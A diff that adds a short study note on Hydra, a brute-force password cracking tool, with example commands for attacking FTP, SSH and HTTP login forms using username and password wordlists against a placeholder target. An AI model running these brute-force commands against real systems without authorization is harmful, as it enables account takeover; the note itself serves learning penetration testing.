@@ -1,0 +1,32 @@
+--------------------------------
+What is hydra?
+--------------------------------
+
+Hydra is a brute force password cracking tool.
+
+https://github.com/vanhauser-thc/thc-hydra
+
+Hydra is able to bruteforce a large majority of common protocols: ssh, http, ftp, snmp, etc etc.
+
+--------------------------------
+Hydra Usage
+--------------------------------
+
+hydra is pretty simple:
+
+when using a single item (username, password etc.) the - is NOT capitalised, if we want to use multiple items (a wordlist) we capitalise the -. For example: 
+
+# Using a single username and a password wordlist to attack an ftp server
+hydra -l *single_user* -P wordlist.txt ftp://TARGET_IP
+
+# using a wordlist of usernames AND passwords to attack ssh 
+# we use '-t 4' to specifiy how many threads to use (allows hydra to run parrallex X times or in this case 4.)
+hydra -L username_wordlist.txt -P password_wordlist.txt TARGET_IP -t 4 ssh
+
+# Hydra is also able to bruteforce http web login forms
+sudo hydra <username> <wordlist> TARGET_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+# A more indepth example. THIS IS NOT FOOL PROOF
+# IT WOULD BE REQUIRED TO LOOK AT THE REQUEST SENT AND SEE THE EXACT DATA IS BEING SENT!!!
+# the 'F:' part is just the string in the response that is supplied when it is incorrect.
+sudo hydra -l username -P passwords.txt  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
